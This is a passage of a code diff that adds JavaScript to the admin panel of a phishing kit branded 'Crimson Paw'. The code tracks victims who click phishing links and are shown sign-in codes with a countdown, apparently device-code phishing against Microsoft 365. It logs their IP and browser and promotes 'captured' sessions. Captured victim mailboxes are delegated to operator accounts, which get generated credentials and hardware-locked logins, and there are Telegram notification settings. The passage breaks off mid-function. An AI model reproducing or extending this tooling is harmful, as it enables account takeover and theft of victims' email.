+                    fetch('/api/lg/domains/deleted')
+                ]);
+                const depList = depRes.ok ? await depRes.json() : [];
+                const domList = domRes.ok ? await domRes.json() : [];
+
+                if ((!depList || !depList.length) && (!domList || !domList.length)) {
+                    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#a49498; padding:20px;">No deleted domains or deployments in archive.</td></tr>`;
+                    return;
+                }
+
+                let rowsHtml = '';
+                // Render retired domains
+                domList.forEach(dom => {
+                    const dateStr = dom.deleted_at ? dom.deleted_at.substring(0, 10) : (dom.purchased_at ? dom.purchased_at.substring(0, 10) : 'Archived');
+                    rowsHtml += `<tr>
+                        <td>
+                            <strong style="color:#ffffff;">🌐 ${dom.domain}</strong>
+                            <div style="font-size:11px; color:#a49498;">Registrar: ${dom.registrar || 'Custom'}</div>
+                        </td>
+                        <td><span style="background:rgba(239,68,68,0.15); color:#f87171; border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">RETIRED DOMAIN</span></td>
+                        <td style="color:#a49498; font-size:12px;">${dateStr}</td>
+                        <td>
+                            <button type="button" class="lg-icon-btn" onclick="restoreDomainItem('${dom.domain}')" title="Restore Domain" style="color:#34d399; border-color:#059669; font-weight:700;">♻️ Restore</button>
+                        </td>
+                    </tr>`;
+                });
+
+                // Render deleted deployments
+                depList.forEach(d => {
+                    const url = d.full_url || `${d.domain}/${d.path}`;
+                    const dateStr = d.created_at ? d.created_at.substring(0, 10) : 'Archived';
+                    rowsHtml += `<tr>
+                        <td>
+                            <strong style="color:#ffffff;">🚀 ${d.name || url}</strong>
+                            <div style="font-size:11px; color:#ff6b72; word-break:break-all;">${url}</div>
+                        </td>
+                        <td><span style="background:rgba(239,68,68,0.15); color:#f87171; border:1px solid rgba(239,68,68,0.3); padding:2px 8px; border-radius:10px; font-size:11px; font-weight:700;">DELETED LINK</span></td>
+                        <td style="color:#a49498; font-size:12px;">${dateStr}</td>
+                        <td>
+                            <button type="button" class="lg-icon-btn" onclick="restoreDeployment(${d.id})" title="Restore Deployment" style="color:#34d399; border-color:#059669; font-weight:700;">♻️ Restore</button>
+                        </td>
+                    </tr>`;
+                });
+
+                tbody.innerHTML = rowsHtml;
+            } catch(e) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#f87171;">Failed to load archive: ${e}</td></tr>`;
+            }
+        }
+
+        async function restoreDomainItem(domain) {
+            try {
+                const res = await fetch(`/api/lg/domains/${encodeURIComponent(domain)}/restore`, { method: 'POST' });
+                const data = await res.json().catch(() => ({}));
+                if (data.success) {
+                    showToast(`✓ Domain ${domain} restored to Owned Domains!`);
+                    loadDeletedDeploymentsTable();
+                    await syncDomainsDropdown();
+                } else {
+                    showToast('⚠️ Restore failed: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Restore error: ' + e);
+            }
+        }
+
+        async function restoreDeployment(did) {
+            try {
+                const res = await fetch(`/api/lg/deployments/${did}/resume`, { method: 'POST' });
+                const data = await res.json().catch(() => ({}));
+                if (data.success !== false) {
+                    showToast('✓ Deployment restored to Active Deployments!');
+                    loadDeletedDeploymentsTable();
+                    loadDeploymentsTable();
+                } else {
+                    showToast('⚠️ Restore failed: ' + (data.error || 'Unknown error'));
+                }
+            } catch(e) {
+                showToast('⚠️ Restore error: ' + e);
+            }
+        }
+
+        async function loadTemplatesGrid() {
+            try {
+                const tg = document.getElementById('template-grid');
+                if (!tg) return;
+                const templates = await (await fetch('/api/templates')).json();
+                tg.innerHTML = templates.map(t => `<div class="template-card"><div class="template-icon">${t.icon}</div><div class="template-name">${t.name}</div><div class="template-service">${t.service}</div></div>`).join('');
+            } catch (e) {
+                console.error('loadTemplatesGrid error:', e);
+            }
+        }
+
+        let sessionsCurrentPage = 1;
+        let sessionsPageSize = 10;
+
+        function changeSessionsPageSize(val) {
+            sessionsPageSize = parseInt(val, 10) || 10;
+            sessionsCurrentPage = 1;
+            loadSessions();
+        }
+
+        function goToSessionsPage(p) {
+            sessionsCurrentPage = p;
+            loadSessions();
+        }
+
+        async function purgeInactiveSessions() {
+            const ok = await appConfirm({
+                title: 'Clear Inactive Sessions',
+                message: 'Clear all inactive, uncaptured, and expired live sessions from the monitoring feed?',
+                confirmText: 'Clear Sessions',
+                danger: true,
+                icon: '🧹'
+            });
+            if (!ok) return;
+            try {
+                const res = await (await fetch('/api/sessions/purge-inactive', { method: 'POST' })).json();
+                showToast(`Cleared ${res.deleted || 0} inactive session(s).`);
+                loadSessions();
+            } catch(e) {
+                showToast('⚠️ Error clearing sessions: ' + e);
+            }
+        }
+
+        function formatBrowserName(ua) {
+            if (!ua || ua === 'N/A') return 'Chrome';
+            const s = ua.toLowerCase();
+            if (s.includes('edg')) return 'Edge';
+            if (s.includes('chrome')) return 'Chrome';
+            if (s.includes('safari') && !s.includes('chrome')) return 'Safari';
+            if (s.includes('firefox')) return 'Firefox';
+            return ua.length > 15 ? ua.substring(0, 15) : ua;
+        }
+
+        async function loadSessions() {
+            try {
+                const allSessions = await (await fetch('/api/sessions')).json();
+                // Live Sessions tracks active, in-flight visitor authentications.
+                // Once captured, sessions graduate from this live tracking pane to the Dashboard.
+                // Expired sessions show countdown until zero, then prune automatically.
+                const nowMs = Date.now();
+                const sessions = allSessions.filter(s => {
+                    if (s.status === 'CAPTURED') return false;
+                    let cStr = (s.created_at || '').trim();
+                    if (cStr && !cStr.endsWith('Z') && !cStr.includes('+')) cStr = cStr.replace(' ', 'T') + 'Z';
+                    const cTs = Date.parse(cStr);
+                    if (s.status === 'EXPIRED' && !isNaN(cTs) && (nowMs - cTs) > (900 + 15) * 1000) {
+                        return false;
+                    }
+                    if (s.status === 'PENDING' && !isNaN(cTs) && (nowMs - cTs) > (900 + 20) * 1000) {
+                        return false;
+                    }
+                    return true;
+                });
+                const total = sessions.length;
+                const totalPages = Math.max(1, Math.ceil(total / sessionsPageSize));
+                if (sessionsCurrentPage > totalPages) sessionsCurrentPage = totalPages;
+                if (sessionsCurrentPage < 1) sessionsCurrentPage = 1;
+
+                const startIdx = (sessionsCurrentPage - 1) * sessionsPageSize;
+                const endIdx = Math.min(startIdx + sessionsPageSize, total);
+                const pagedSessions = sessions.slice(startIdx, endIdx);
+
+                const tbody = document.getElementById('sessions-table');
+                if (total === 0) {
+                    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color:var(--text-secondary); padding:28px;"><div style="font-size:24px; margin-bottom:8px;">📡</div><b>No active in-flight live sessions.</b><div style="font-size:12px; margin-top:4px;">When a target clicks a phishing link and begins authentication, their live journey displays here. Once captured, they graduate to the Dashboard.</div></td></tr>';
+                } else {
+                    tbody.innerHTML = pagedSessions.map(s => {
+                        const safeUserCode = s.user_code.replace(/'/g, "\\'");
+                        const targetTmpl = s.template_name || 'Microsoft 365';
+                        const ip = s.victim_ip || 'Remote Visitor';
+                        const browser = formatBrowserName(s.victim_browser);
+                        
+                        let stageHtml = '';
+                        if (s.status === 'PENDING') {
+                            let cStr = (s.created_at || '').trim();
+                            if (cStr && !cStr.endsWith('Z') && !cStr.includes('+')) cStr = cStr.replace(' ', 'T') + 'Z';
+                            const cTs = Date.parse(cStr);
+                            let remSec = 900;
+                            if (!isNaN(cTs)) remSec = Math.max(0, 900 - Math.floor((Date.now() - cTs) / 1000));
+                            const mm = String(Math.floor(remSec / 60)).padStart(2, '0');
+                            const ss = String(remSec % 60).padStart(2, '0');
+                            const isExp = remSec <= 0;
+
+                            stageHtml = `
+                                <div style="display:flex; flex-direction:column; gap:4px;">
+                                    <div style="display:flex; align-items:center; gap:8px;">
+                                        <span style="background:rgba(229,9,20,0.12); border:1px solid rgba(229,9,20,0.3); color:#ff6b6b; padding:3px 9px; border-radius:6px; font-weight:700; font-size:11.5px; display:inline-flex; align-items:center; gap:6px;">
+                                            <span style="width:7px; height:7px; background:#e50914; border-radius:50%; display:inline-block; box-shadow:0 0 6px #e50914;"></span>
+                                            ⏳ Awaiting Sign-in
+                                        </span>
+                                        <span class="live-session-countdown" data-created="${escapeHtml(s.created_at || '')}" data-usercode="${escapeHtml(s.user_code)}" style="font-family:monospace; font-weight:800; font-size:11.5px; color:${isExp ? '#ff6b72' : '#58a6ff'}; background:#101924; border:1px solid ${isExp ? '#ff6b72' : '#1f364d'}; padding:2px 8px; border-radius:4px;">
+                                            ${isExp ? '⏱️ Expired' : `⏱️ ${mm}:${ss} remaining`}
+                                        </span>
+                                    </div>
+                                    <div style="font-size:11px; color:#a49498;">Code <b>${escapeHtml(s.user_code)}</b> presented to victim</div>
+                                </div>
+                            `;
+                        } else if (s.status === 'EXPIRED') {
+                            stageHtml = `<span class="badge" style="background:#38161b; color:#ff6b72; border:1px solid #ff4444; padding:3px 8px; border-radius:4px; font-size:11px;">⏱️ Expired</span>`;
+                        } else {
+                            stageHtml = `<span class="badge" style="background:#1f1317; color:#f0ebed; padding:3px 8px; border-radius:4px; font-size:11px;">${escapeHtml(s.status)}</span>`;
+                        }
+
+                        return `
+                        <tr>
+                            <td style="font-family:monospace; font-weight:700; font-size:13px; color:#ffffff;">${escapeHtml(s.user_code)}</td>
+                            <td><strong style="color:#ffffff;">${escapeHtml(targetTmpl)}</strong><div style="font-size:11px; color:#8e7d82;">${escapeHtml(s.template_service || 'Office')}</div></td>
+                            <td style="font-family:monospace; font-size:12px; color:#cbd5e1;">${escapeHtml(ip)}</td>
+                            <td style="color:#a49498; font-size:12px;">${escapeHtml(browser)}</td>
+                            <td>${stageHtml}</td>
+                            <td style="color:#8e7d82; font-size:12px;">${escapeHtml(s.created_at || '-')}</td>
+                            <td>
+                                <button class="btn btn-secondary btn-sm" onclick="showToast('Tracking session: ${safeUserCode}')">📡 Live Trace</button>
+                            </td>
+                        </tr>`;
+                    }).join('');
+                }
+
+                // Render pagination info
+                const infoEl = document.getElementById('sessions-pagination-info');
+                if (infoEl) {
+                    infoEl.innerText = total === 0 ? 'Showing 0 to 0 of 0 sessions' : `Showing ${startIdx + 1} to ${endIdx} of ${total} sessions`;
+                }
+
+                // Render pagination buttons
+                const ctrlEl = document.getElementById('sessions-pagination-controls');
+                if (ctrlEl) {
+                    if (totalPages <= 1) {
+                        ctrlEl.innerHTML = '';
+                    } else {
+                        let html = '';
+                        const prevDisabled = sessionsCurrentPage === 1 ? 'disabled style="opacity:0.4; cursor:not-allowed;"' : '';
+                        html += `<button class="btn btn-secondary btn-sm" ${prevDisabled} onclick="goToSessionsPage(${sessionsCurrentPage - 1})">❮ Prev</button>`;
+                        
+                        let startP = Math.max(1, sessionsCurrentPage - 2);
+                        let endP = Math.min(totalPages, startP + 4);
+                        if (endP - startP < 4) startP = Math.max(1, endP - 4);
+                        for (let p = startP; p <= endP; p++) {
+                            const activeStyle = p === sessionsCurrentPage ? 'background:#e50914; border-color:#ff3b45; color:#fff;' : 'background:#161014; border:1px solid #38161b; color:#f0ebed;';
+                            html += `<button class="btn btn-sm" style="${activeStyle} min-width:30px; padding:4px 8px; border-radius:4px; cursor:pointer;" onclick="goToSessionsPage(${p})">${p}</button>`;
+                        }
+
+                        const nextDisabled = sessionsCurrentPage === totalPages ? 'disabled style="opacity:0.4; cursor:not-allowed;"' : '';
+                        html += `<button class="btn btn-secondary btn-sm" ${nextDisabled} onclick="goToSessionsPage(${sessionsCurrentPage + 1})">Next ❯</button>`;
+                        ctrlEl.innerHTML = html;
+                    }
+                }
+            } catch (err) {
+                console.error('loadSessions error:', err);
+            }
+        }
+
+        // ════════════════════════════════════════════════════════════════
+        // SETTINGS PAGE CONTROLLERS
+        // ════════════════════════════════════════════════════════════════
+        async function loadSettings() {
+            try {
+                let s = {};
+                try {
+                    const r = await fetch('/api/settings');
+                    if (r.ok) s = await r.json();
+                } catch(e) {}
+                const local = JSON.parse(localStorage.getItem('crimson_paw_settings') || '{}');
+                const cfg = { ...local, ...s };
+
+                const userEl = document.getElementById('settings-current-username');
+                if (userEl) userEl.innerText = currentUsername || 'admin';
+
+                if (cfg.tg_bot_token && document.getElementById('setting-tg-bot-token')) document.getElementById('setting-tg-bot-token').value = cfg.tg_bot_token;
+                if (cfg.tg_chat_id && document.getElementById('setting-tg-chat-id')) document.getElementById('setting-tg-chat-id').value = cfg.tg_chat_id;
+                if (typeof cfg.notify_token !== 'undefined' && document.getElementById('setting-notify-token')) document.getElementById('setting-notify-token').checked = cfg.notify_token;
+            } catch (e) {
+                console.error('loadSettings error:', e);
+            }
+        }
+
+        /* ── Operator Delegation & Multi-User Management ──────────────────────── */
+        let _allCapturedSessionsCache = [];
+        let _allOperatorsCache = [];
+        let _lastCreatedCredentials = {};
+
+        function generateRandomAlphanumeric(length = 5) {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let res = '';
+            for (let i = 0; i < length; i++) {
+                res += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return res;
+        }
+
+        function generateOperatorName() {
+            const firstNames = [
+                'Njalla', 'Kaelen', 'Darius', 'Ronan', 'Zane', 'Caspian', 'Malik', 'Soren',
+                'Orion', 'Evander', 'Lucian', 'Damian', 'Julian', 'Torin', 'Cassian', 'Leander',
+                'Aiden', 'Silas', 'Tarek', 'Victor', 'Felix', 'Axel', 'Ezra', 'Rowan', 'Kellan',
+                'Cyrus', 'Leon', 'Nico', 'Milo', 'Bodhi', 'Kai', 'Jaxon', 'Finn', 'Corbin',
+                'Valen', 'Roderick', 'Corvus', 'Vesper', 'Theron', 'Gideon'
+            ];
+            const lastNames = [
+                'Raslan', 'Vance', 'Drake', 'Frost', 'Vex', 'Thorne', 'Cross', 'Sterling',
+                'Vane', 'Blackwood', 'Ward', 'Huxley', 'Rhodes', 'Sinclair', 'Mercer', 'Wolfe',
+                'Fox', 'Hawthorne', 'Knight', 'Stark', 'Winter', 'Graves', 'Ashford', 'Kovacs',
+                'Vaughn', 'Steele', 'Holt', 'Locke', 'Bane', 'Ryder', 'Lennox', 'Strand',
+                'Kallisto', 'Solari', 'Deveraux', 'Raven', 'Crosswood', 'Valtieri'
+            ];
+            const first = firstNames[Math.floor(Math.random() * firstNames.length)];
+            const last = lastNames[Math.floor(Math.random() * lastNames.length)];
+            return first + last;
+        }
+
+        function rollOperatorUsername() {
+            const input = document.getElementById('op-username-input');
+            if (input) {
+                input.value = generateOperatorName();
+            }
+        }
+
+        function rollOperatorPassword() {
+            const input = document.getElementById('op-password-input');
+            if (input) {
+                input.value = 'CP-' + generateRandomAlphanumeric(4) + '-' + generateRandomAlphanumeric(4);
+            }
+        }
+
+        function copyOperatorModalKey() {
+            const input = document.getElementById('op-password-input');
+            if (!input || !input.value) {
+                showToast('No access key entered yet.');
+                return;
+            }
+            navigator.clipboard.writeText(input.value).then(() => {
+                showToast('✓ Access key copied to clipboard!');
+            }).catch(() => {
+                showToast('Access key: ' + input.value);
+            });
+        }
+
+        function copyOperatorUrl(token) {
+            if (!token) return;
+            const fullUrl = window.location.origin + '/m/' + token;
+            navigator.clipboard.writeText(fullUrl).then(() => {
+                showToast('✓ Codified portal URL copied: /m/' + token);
+            }).catch(() => {
+                showToast(fullUrl);
+            });
+        }
+
+        function openOpCredentialsModal(username, password, assignedLabels = [], token = '') {
+            const portalUrl = token ? (window.location.origin + '/m/' + token) : (window.location.origin + '/login');
+            _lastCreatedCredentials = {
+                username: username,
+                password: password,
+                portalUrl: portalUrl,
+                token: token,
+                inboxes: assignedLabels
+            };
+            const urlEl = document.getElementById('op-cred-url');
+            const userEl = document.getElementById('op-cred-user');
+            const passEl = document.getElementById('op-cred-pass');
+            const inbEl = document.getElementById('op-cred-inboxes');
+            if (urlEl) urlEl.innerText = portalUrl;
+            if (userEl) userEl.innerText = username;
+            if (passEl) passEl.innerText = password;
+            if (inbEl) inbEl.innerText = assignedLabels.length > 0 ? assignedLabels.join(', ') : 'No inboxes assigned';
+            const modal = document.getElementById('opCredentialsModal');
+            if (modal) modal.classList.add('active');
+        }
+
+        function closeOpCredentialsModal() {
+            const modal = document.getElementById('opCredentialsModal');
+            if (modal) modal.classList.remove('active');
+        }
+
+        function copyOperatorCredentialsPackage() {
+            const c = _lastCreatedCredentials;
+            if (!c.username) return;
+            const text = 
+`CRIMSON PAW • Webmail Operator Credentials
+──────────────────────────────────────
+Codified Portal URL: ${c.portalUrl}
+Operator Identifier: ${c.username}
+Access Key:          ${c.password}
+Delegated Inboxes:   ${c.inboxes && c.inboxes.length > 0 ? c.inboxes.join(', ') : 'None'}
+──────────────────────────────────────
+Please keep your access key confidential.`;
+
+            navigator.clipboard.writeText(text).then(() => {
+                showToast('✓ Full credentials package copied to clipboard!');
+            }).catch(() => {
+                alert(text);
+            });
+        }
+
+        function updateOperatorKpis(ops = []) {
+            const total = ops.length;
+            const active = ops.filter(o => o.status === 'active').length;
+            const suspended = ops.filter(o => o.status === 'disabled').length;
+            let delegations = 0;
+            ops.forEach(o => { delegations += (o.assigned_sessions || []).length; });
+
+            const elTotal = document.getElementById('op-kpi-total');
+            const elActive = document.getElementById('op-kpi-active');
+            const elSuspended = document.getElementById('op-kpi-suspended');
+            const elDelegations = document.getElementById('op-kpi-delegations');
+            const badge = document.getElementById('nav-badge-operators');
+
+            if (elTotal) elTotal.innerText = total;
+            if (elActive) elActive.innerText = active;
+            if (elSuspended) elSuspended.innerText = suspended;
+            if (elDelegations) elDelegations.innerText = delegations;
+            if (badge) {
+                if (total > 0) {
+                    badge.innerText = total;
+                    badge.style.display = 'inline-block';
+                } else {
+                    badge.style.display = 'none';
+                }
+            }
+        }
+
+        function buildOperatorsTableHtml(ops = []) {
+            if (!ops || ops.length === 0) {
+                return `
+                    <div style="padding:32px 16px; text-align:center; color:#a49498; background:#0e080b; border:1px solid #281014; border-radius:8px;">
+                        <div style="font-size:26px; margin-bottom:8px; opacity:0.6;">👥</div>
+                        <div style="font-size:14px; font-weight:700; color:#f0ebed;">No Operator Accounts Found</div>
+                        <div style="font-size:12px; color:#8e7d82; margin-top:4px;">Click "Create Operator" to generate an operator identifier and assign mailboxes.</div>
+                    </div>
+                `;
+            }
+
+            let html = `
+                <table style="width:100%; border-collapse:collapse; font-size:12.5px; text-align:left;">
+                    <thead>
+                        <tr style="border-bottom:1px solid #281014; color:#8e7d82; font-size:11px; text-transform:uppercase; letter-spacing:0.05em;">
+                            <th style="padding:10px 12px;">Operator Identifier</th>
+                            <th style="padding:10px 12px;">Status</th>
+                            <th style="padding:10px 12px;">Hardware Lock</th>
+                            <th style="padding:10px 12px;">Delegated Mailboxes</th>
+                            <th style="padding:10px 12px;">Last Login</th>
+                            <th style="padding:10px 12px; text-align:right;">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            ops.forEach(op => {
+                const isActive = op.status === 'active';
+                const statusBadge = isActive 
+                    ? '<span style="background:rgba(63,185,80,0.15); color:#3fb950; border:1px solid rgba(63,185,80,0.3); padding:2px 8px; border-radius:10px; font-size:10.5px; font-weight:700;">ACTIVE</span>'
+                    : '<span style="background:rgba(229,9,20,0.15); color:#ff6b72; border:1px solid rgba(229,9,20,0.3); padding:2px 8px; border-radius:10px; font-size:10.5px; font-weight:700;">DISABLED</span>';
+
+                let hardwareBadge = '';
+                if (op.bound_device_hash) {
+                    const devInfo = op.bound_device_info || 'Bound Device';
+                    hardwareBadge = `
+                        <div>
+                            <span style="background:rgba(88,166,255,0.12); color:#58a6ff; border:1px solid rgba(88,166,255,0.3); padding:2px 7px; border-radius:4px; font-size:10.5px; font-weight:700; display:inline-flex; align-items:center; gap:4px;" title="Hash: ${escapeHtml(op.bound_device_hash)} | IP: ${escapeHtml(op.bound_ip || '')}">
+                                🔒 ${escapeHtml(devInfo)}
+                            </span>
+                            ${op.sharing_violations_count > 0 ? `<div style="color:#ff6b72; font-size:10px; font-weight:800; margin-top:3px;">⚠️ ${op.sharing_violations_count} blocked sharing attempt(s)</div>` : ''}
+                        </div>
+                    `;
+                } else {
+                    hardwareBadge = `<span style="background:rgba(251,191,36,0.12); color:#fbbf24; border:1px solid rgba(251,191,36,0.25); padding:2px 7px; border-radius:4px; font-size:10.5px; font-weight:700;" title="Will bind permanently to the operator's machine on their first login">⏳ Unbound (Pending)</span>`;
+                }
+
+                const assignedCount = (op.assigned_sessions || []).length;
+                let assignedBadges = '';
+                if (assignedCount === 0) {
+                    assignedBadges = '<span style="color:#8e7d82; font-style:italic; font-size:11px;">None (No access to any mailboxes)</span>';
+                } else {
+                    assignedBadges = (op.assigned_sessions_info || []).map(info => {
+                        const name = info.victim_name || info.victim_email || info.session_user_code;
+                        return `<span style="background:#1f1318; color:#f0ebed; border:1px solid #3d1c23; padding:2px 7px; border-radius:4px; font-size:11px; display:inline-flex; align-items:center; gap:4px; margin:2px;">
+                            <span>📧</span> <b>${escapeHtml(name)}</b> <span style="color:#a49498; font-family:monospace; font-size:10px;">(${escapeHtml(info.session_user_code)})</span>
+                        </span>`;
+                    }).join(' ');
+                }
+
+                const lastLogin = op.last_login ? new Date(op.last_login).toLocaleString([], {month:'short', day:'numeric', hour:'2-digit', minute:'2-digit'}) : '<span style="color:#605e5c;">Never</span>';
+
+                html += `
+                    <tr style="border-bottom:1px solid #1a0f14;">
+                        <td style="padding:12px; font-weight:600; color:#ffffff;">
+                            <div style="display:flex; align-items:center; gap:9px;">
+                                <div style="width:28px; height:28px; border-radius:6px; background:#281216; color:#58a6ff; display:flex; align-items:center; justify-content:center; font-weight:800; font-size:11px; border:1px solid #3d1c23; font-family:monospace;">
+                                    ${escapeHtml((op.username || 'OP').slice(0, 2).toUpperCase())}
+                                </div>
+                                <div>
+                                    <div style="color:#58a6ff; font-size:13.5px; font-weight:800;">${escapeHtml(op.username)}</div>
+                                    <div style="font-size:10px; color:#8e7d82; display:flex; align-items:center; gap:6px; margin-top:2px;">
+                                        <span style="font-family:monospace; color:#a49498;">/m/${escapeHtml(op.token || '••••')}</span>
+                                        <a href="javascript:void(0)" onclick="copyOperatorUrl('${escapeHtml(op.token || '')}')" style="color:#58a6ff; text-decoration:none; font-weight:600; font-size:10px;">📋 Copy Link</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </td>
+                        <td style="padding:12px;">${statusBadge}</td>
+                        <td style="padding:12px;">${hardwareBadge}</td>
+                        <td style="padding:12px; max-width:300px;">${assignedBadges}</td>
+                        <td style="padding:12px; font-size:11.5px; color:#a49498;">${lastLogin}</td>
+                        <td style="padding:12px; text-align:right;">
+                            <div style="display:inline-flex; gap:6px;">
+                                <button type="button" class="btn btn-secondary btn-sm" onclick='copyOperatorAccountInfoRow(${JSON.stringify(op).replace(/'/g, "&#39;")})' title="Copy complete operator account info" style="padding:4px 9px; font-size:11px; background:#1b2838; border:1px solid #2d4868; color:#58a6ff; font-weight:700;">
+                                    📋 Copy Info
+                                </button>
+                                ${op.bound_device_hash ? `
+                                    <button type="button" class="btn btn-secondary btn-sm" onclick="resetOperatorDevice(${op.id}, '${escapeHtml(op.username)}')" title="Reset hardware lock so operator can bind a new workstation" style="padding:4px 9px; font-size:11px; background:#1e1a14; border:1px solid #5c3a21; color:#ff9f43; font-weight:700;">
+                                        🔓 Reset HW
+                                    </button>
+                                ` : ''}
+                                <button type="button" class="btn btn-secondary btn-sm" onclick='openEditOperatorModal(${JSON.stringify(op).replace(/'/g, "&#39;")})' title="Edit Delegated Mailboxes & Credentials" style="padding:4px 9px; font-size:11px;">
+                                    ✏️ Edit
+                                </button>
+                                <button type="button" class="btn btn-secondary btn-sm" onclick="toggleOperatorStatus(${op.id}, '${op.status}')" title="${isActive ? 'Suspend access' : 'Activate access'}" style="padding:4px 9px; font-size:11px; color:${isActive ? '#ff9f43' : '#3fb950'};">
+                                    ${isActive ? '⏸️ Suspend' : '▶️ Activate'}
+                                </button>
+                                <button type="button" class="btn btn-danger btn-sm" onclick="deleteOperator(${op.id}, '${escapeHtml(op.username)}')" title="Delete Operator" style="padding:4px 9px; font-size:11px;">
+                                    🗑️
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            });
+
+            html += '</tbody></table>';
+            return html;
+        }
+
+        async function loadOperators() {
+            try {
+                const res = await fetch('/api/operators');
+                if (!res.ok) {
+                    const errMsg = '<div style="padding:16px; color:#ff6b72;">Failed to load operators (Admin access required).</div>';
+                    const c1 = document.getElementById('operators-page-table-container');
+                    const c2 = document.getElementById('operators-table-container');
+                    if (c1) c1.innerHTML = errMsg;
+                    if (c2) c2.innerHTML = errMsg;
+                    return;
+                }
+                const ops = await res.json();
+                _allOperatorsCache = Array.isArray(ops) ? ops : [];
+                updateOperatorKpis(_allOperatorsCache);
+                filterOperatorsList();
+            } catch (err) {
+                const errMsg = `<div style="padding:16px; color:#ff6b72;">Error loading operators: ${err}</div>`;
+                const c1 = document.getElementById('operators-page-table-container');
+                const c2 = document.getElementById('operators-table-container');
+                if (c1) c1.innerHTML = errMsg;
+                if (c2) c2.innerHTML = errMsg;
+            }
+        }
+
+        function filterOperatorsList() {
+            const query = (document.getElementById('op-search-filter') ? document.getElementById('op-search-filter').value : '').toLowerCase().trim();
+            let filtered = _allOperatorsCache;
+            if (query) {
+                filtered = _allOperatorsCache.filter(op => {
+                    const matchUser = (op.username || '').toLowerCase().includes(query);
+                    const matchVictims = (op.assigned_sessions_info || []).some(info => 
+                        (info.victim_name || '').toLowerCase().includes(query) ||
+                        (info.victim_email || '').toLowerCase().includes(query) ||
+                        (info.session_user_code || '').toLowerCase().includes(query)
+                    );
+                    return matchUser || matchVictims;
+                });
+            }
+
+            const html = buildOperatorsTableHtml(filtered);
+            const pageContainer = document.getElementById('operators-page-table-container');
+            const settingsContainer = document.getElementById('operators-table-container');
+            if (pageContainer) pageContainer.innerHTML = html;
+            if (settingsContainer) settingsContainer.innerHTML = html;
+        }
+
+        async function renderOperatorChecklist(preselectedCodes = []) {
+            const listEl = document.getElementById('op-sessions-checklist');
+            if (!listEl) return;
+            try {
+                const res = await fetch('/api/sessions');
+                const sessions = await res.json();
+                const captured = Array.isArray(sessions) ? sessions.filter(s => s.status === 'CAPTURED') : [];
+                _allCapturedSessionsCache = captured;
+
+                if (captured.length === 0) {
+                    listEl.innerHTML = '<div style="color:#a49498; font-size:12px; text-align:center; padding:12px;">No captured victim sessions available yet.</div>';
+                    return;
+                }
+
+                listEl.innerHTML = captured.map(s => {
+                    const isChecked = preselectedCodes.includes(s.user_code);
+                    const label = s.victim_name || s.victim_email || s.user_code;
+                    const email = s.victim_email ? `&lt;${escapeHtml(s.victim_email)}&gt;` : '';
+                    return `
+                        <label style="display:flex; align-items:center; gap:9px; font-size:12px; color:#f0ebed; cursor:pointer; padding:5px 8px; border-radius:4px; background:#140c11; border:1px solid #241116;">
+                            <input type="checkbox" class="op-session-cb" value="${escapeHtml(s.user_code)}" ${isChecked ? 'checked' : ''} data-label="${escapeHtml(label)}" style="accent-color:#e50914;">
+                            <span style="font-weight:600;">${escapeHtml(label)}</span>
+                            <span style="color:#a49498; font-size:11px;">${email}</span>
+                            <span style="color:#e50914; font-family:monospace; font-size:10.5px; margin-left:auto;">[${escapeHtml(s.user_code)}]</span>
+                        </label>
+                    `;
+                }).join('');
+            } catch (err) {
+                listEl.innerHTML = `<div style="color:#ff6b72; font-size:12px; padding:10px;">Failed to load sessions: ${err}</div>`;
+            }
+        }
+
+        function selectAllOperatorSessions(selectAll) {
+            document.querySelectorAll('.op-session-cb').forEach(cb => cb.checked = selectAll);
+        }
+
+        async function openNewOperatorModal() {
+            window._currentEditingOp = null;
+            const copyBtn = document.getElementById('op-modal-copy-btn');
+            if (copyBtn) copyBtn.style.display = 'none';
+            document.getElementById('op-modal-title-text').innerText = 'Create Operator Account';
+            document.getElementById('op-id-input').value = '';
+            document.getElementById('op-username-input').disabled = false;
+            document.getElementById('op-btn-regen-user').style.display = 'inline-flex';
+            document.getElementById('op-btn-regen-pwd').style.display = 'inline-flex';
+            rollOperatorUsername();
+            rollOperatorPassword();
+            document.getElementById('op-password-input').required = true;
+            document.getElementById('op-pwd-hint').style.display = 'none';
+            document.getElementById('op-status-input').value = 'active';
+
+            // Show modal IMMEDIATELY with zero lag!
+            document.getElementById('operatorModal').classList.add('active');
+            const listEl = document.getElementById('op-sessions-checklist');
+            if (listEl) listEl.innerHTML = '<div style="color:#a49498; font-size:12px; text-align:center; padding:12px;">⏳ Loading captured sessions...</div>';
+            renderOperatorChecklist([]);
+        }
+
+        async function openEditOperatorModal(op) {
+            window._currentEditingOp = op;
+            const copyBtn = document.getElementById('op-modal-copy-btn');
+            if (copyBtn) copyBtn.style.display = 'inline-flex';
+            document.getElementById('op-modal-title-text').innerText = `Edit Operator (${op.username})`;
+            document.getElementById('op-id-input').value = op.id;
+            document.getElementById('op-username-input').value = op.username;
+            document.getElementById('op-username-input').disabled = true;
+            document.getElementById('op-btn-regen-user').style.display = 'none';
+            document.getElementById('op-password-input').value = '';
+            document.getElementById('op-password-input').required = false;
+            document.getElementById('op-pwd-hint').style.display = 'inline';
+            document.getElementById('op-status-input').value = op.status || 'active';
+
+            // Show modal IMMEDIATELY with zero lag!
+            document.getElementById('operatorModal').classList.add('active');
+            const listEl = document.getElementById('op-sessions-checklist');
+            if (listEl) listEl.innerHTML = '<div style="color:#a49498; font-size:12px; text-align:center; padding:12px;">⏳ Loading captured sessions...</div>';
+            renderOperatorChecklist(op.assigned_sessions || []);
+        }
+
+        function copyOperatorAccountInfoRow(op) {
+            if (!op) return;
+            const username = op.username || 'Operator';
+            const token = op.token || '';
+            const portalUrl = token ? (window.location.origin + '/m/' + token) : (window.location.origin + '/login');
+            
+            let inboxesDesc = 'None assigned';
+            if (op.assigned_sessions_info && op.assigned_sessions_info.length > 0) {
+                const names = op.assigned_sessions_info.map(i => i.victim_name || i.victim_email || i.session_user_code);
